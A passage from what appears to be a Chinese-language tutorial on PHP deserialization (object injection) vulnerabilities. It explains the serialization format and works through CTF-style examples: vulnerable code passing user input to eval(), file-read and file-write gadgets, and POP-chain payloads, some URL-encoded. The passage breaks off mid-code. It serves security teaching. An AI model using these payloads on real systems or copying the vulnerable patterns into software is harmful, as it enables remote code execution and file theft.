class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span> = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">create_d</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$d</span> = <span class="string">&#x27;ddd&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$object</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127102343.png"></p><p>O:4:”Test”:3:{s:1:”a”;s:3:”aaa”;s:7:”Testb”;s:3:”bbb”;s:4:”*c”;s:3:”ccc”;}</p><p>o代表是一个对象，4是对象object的长度，3的意思是有三个类属性，花括号里的是类属性的内容</p><p>属性受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后属性的长度和名称会发生变化</p><ol><li><p>public：不变   </p><p>属性类型:属性长度:”名称”; 属性值类型:属性值长度:”属性值”;</p><p>s:1:”a”;s:3:”aaa”;</p><p>public $a = ‘aaa’;</p></li><li><p>private：在属性名前加上类名，长度变为 属性长度+类名长度+2</p><p>属性类型:属性长度+类名长度+2:”类名+名称”;属性值类型:属性值长度:”属性值”</p><p>s:7:”Testb”;s:3:”bbb”;  </p><blockquote><p>Test(4)+b(1)+2=7</p><p>这个2怎么来的：</p><p>\x00Test\x00b</p></blockquote><p>private $b = ‘bbb’;</p></li><li><p>protected：在属性名前加上* , 长度+3</p><p>s:4:”*c”;s:3:”ccc”;</p><blockquote><p>c(1)+3=4</p><p>这个3怎么来的：</p><p>\x00*\x00c</p></blockquote><p>protected $c = ‘ccc’;</p></li></ol><p>序列化格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a - array                    b - boolean  </span><br><span class="line">d - double                   i - integer</span><br><span class="line">o - common object            r - reference</span><br><span class="line">s - string                   C - custom object</span><br><span class="line">O - class                  N - null</span><br><span class="line">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure><h4 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化-unserialize"></a>反序列化-unserialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-4.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ser</span> = <span class="string">&#x27;O:6:&quot;object&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:5:&quot;hello&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ser</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line">    var_dump(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127105456.png"></p><blockquote><p>private和protected属性反序列化失败</p></blockquote><h2 id="0x2-反序列化漏洞-对象注入"><a href="#0x2-反序列化漏洞-对象注入" class="headerlink" title="0x2.反序列化漏洞 - 对象注入"></a>0x2.反序列化漏洞 - 对象注入</h2><p>反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果让攻击者操纵任意反序列数据， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用</p><p>反序列化漏洞条件：</p><p>  　　1. 代码中有可利用的类，并且类中有__wakeup()，__sleep()，__destruct()这类特殊条件下可以自己调用的魔术方法。<br>        　　2. unserialize()函数的参数可控。</p><blockquote><p>记住两点：</p><p>1.执行反序列化，执行__destruct()和__wakeup()</p><p>2.把对象当做字符串，执行__tostring()</p></blockquote><h3 id="实例1-destruct-利用"><a href="#实例1-destruct-利用" class="headerlink" title="实例1-__destruct()利用"></a>实例1-__destruct()利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$len</span> = strlen(<span class="variable">$test</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;O:1:\&quot;A\&quot;:1:&#123;s:4:\&quot;test\&quot;;s:&quot;</span>.<span class="variable">$len</span>.<span class="string">&quot;:\&quot;&quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;;\&quot;;&#125;&quot;</span>; <span class="comment">// 构造序列化对象</span></span><br><span class="line"><span class="variable">$test_unser</span> = unserialize(<span class="variable">$p</span>); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过调用__destruct()这个析构函数，将恶意的payload注入，导致代码执行。</p><p>根据上面的魔术方法的介绍，当程序执行unserialize()反序列化的时候，会触发__destruct()方法，同时也可以触发__wakeup()方法。但是如果想注入恶意payload，还需要对$test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的$test属性进行覆盖</p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127111342.png"></p><h3 id="实例2-tostring-利用"><a href="#实例2-tostring-利用" class="headerlink" title="实例2-__tostring()利用"></a>实例2-__tostring()利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(file_get_contents(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))</span><br><span class="line">    &#123; </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>; </span><br><span class="line">       <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; </span><br><span class="line">       <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line">       <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>); </span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$password</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hint.php魔术方法__toString调用了file_get_contents($this-&gt;file); 通过2-2.php理的反序列化将$this-&gt;file替换成flag.php，且把对象当做字符串输出，会触发__toString即可读出flag值</p><p>但2-2.php里限制了txt参数必须恒等于welcome to the bugkuctf，可以使用php://input传入。</p><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">txt=php:<span class="comment">//input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128141724.png"></p><h3 id="实例3-wakeup-利用"><a href="#实例3-wakeup-利用" class="headerlink" title="实例3-__wakeup()利用"></a>实例3-__wakeup()利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>如上代码主要通过调用魔术方法__wakeup将$test的值写入flag.php文件中，当调用unserialize()反序列化操作时会触发__wakeup魔术方法，接下来就需要构造传进去的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//这里浏览器可能无法显示，可以查看源代码,或使用var_dump()输出结果</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">19</span>:<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在线序列化/反序列化：<a href="https://www.toolnb.com/tools/phpserialize.html">https://www.toolnb.com/tools/phpserialize.html</a></p><p>php在线运行：<a href="https://c.runoob.com/compile/1">https://c.runoob.com/compile/1</a></p></blockquote><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127143859.png"></p><p>在执行unserialize()方法时会触发__wakeup()方法执行，将传入的字符串反序列化后，会替换掉test类里面$test变量的值，将php探针写入flag.php文件中，并通过下面的require引用，导致代码执行。</p><h2 id="0x3-反序列化利用-POP"><a href="#0x3-反序列化利用-POP" class="headerlink" title="0x3.反序列化利用-POP"></a>0x3.反序列化利用-POP</h2><p>上面的两个例子都是基于 “ 自动调用 “ 的魔法函数。但当漏洞/危险代码存在类的普通方法中，就不能指望通过 “ 自动调用 “ 来达到目的了。这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的payload。</p><h3 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP-面向属性编程"></a>POP-面向属性编程</h3><p>Property-Oriented Programing，与pwn中的返回导向编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链，最终达到攻击者邪恶的目的。</p><p>类似于pwn中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的 “ gadget “ 找到漏洞点。</p><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>把魔术方法作为最小的gadget，然后在魔术方法中调用其他函数gadget。通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN。</p><p>此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果</p><h3 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h3><h4 id="常用的方法"><a href="#常用的方法" class="headerlink" title="常用的方法"></a>常用的方法</h4><ul><li>命令执行：exec()、passthru()、popen()、system()</li><li>文件操作：file_put_contents()、file_get_contents()、unlink()</li><li>代码执行：eval()、assert()、call_user_func()</li></ul><h4 id="大S支持16进制字符串"><a href="#大S支持16进制字符串" class="headerlink" title="大S支持16进制字符串"></a>大S支持16进制字符串</h4><p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>; -&gt; S:<span class="number">4</span>:<span class="string">&quot;use\72&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><p>在php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。类似于指针。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">A = &amp;<span class="variable">$B</span>;</span> </span><br></pre></td></tr></table></figure><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p>配合PHP伪协议实现文件包含、命令执行等漏洞。如glob:// 伪协议查找匹配的文件路径模式。</p><h4 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h4><blockquote><p>一般POP链都是反着程序来生成，将我们要实现的代码序列化，传入程序进行反序列化 ，就可以让程序按照我们的想法执行</p></blockquote><h5 id="实例1-改写魔术函数及属性"><a href="#实例1-改写魔术函数及属性" class="headerlink" title="实例1 - 改写魔术函数及属性"></a>实例1 - 改写魔术函数及属性</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello bmjoker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a = new main();</span></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>入手点在eval，但是eval不在魔术方法里。利用的方法是，调用evil类中的action方法，并且改写data属性，形成任意代码执行。</p><p>这里就需要去构造POP链，让__construct()去调用evil类，并且给data属性赋值。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> main();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//这里一定要去看源代码，不然\x00是看不到的</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;main&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;*ClassObj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;evildata&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是由于$ClassObj是protected类型修饰，$data是private类型修饰，在序列化的时候，多出来的字节都被\x00填充，需要进行在代码中使用urlencode对序列化后字符串进行编码，否则无法复制解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>main%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>ClassObj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>evil%<span class="number">00</span>data%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>phpinfo%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127143704.png"></p><h5 id="实例2-改写不可控的属性"><a href="#实例2-改写不可控的属性" class="headerlink" title="实例2 - 改写不可控的属性"></a>实例2 - 改写不可控的属性</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="variable">$user</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&quot;flag&quot;</span>)!==<span class="literal">False</span>) </span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;/etc/hostname&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;/etc/passwd&quot;</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;user = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span 